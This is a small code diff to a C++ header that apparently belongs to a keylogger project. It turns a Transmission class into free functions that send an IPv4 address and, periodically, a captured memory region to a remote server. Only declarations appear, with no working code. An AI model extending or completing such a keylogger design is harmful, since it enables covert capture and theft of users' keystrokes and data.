@@ -14,13 +14,7 @@
 #define TRANSMISSION_H
 #include "Keylogger.h"
 
-class Transmission {
-private:
-    const std::string serverUrl = SERVER_URL;
-
-public:
-    int sendIpv4ToServer(const char* ipv4Address);
-    void sendToServerPeriodically(MemoryRegion* memRegion);
-};
+int sendIpv4ToServer(const char* serverUrl, const char* ipv4Address);
+void sendToServerPeriodically(MemoryRegion* memRegion, const char* serverUrl);
 
 #endif
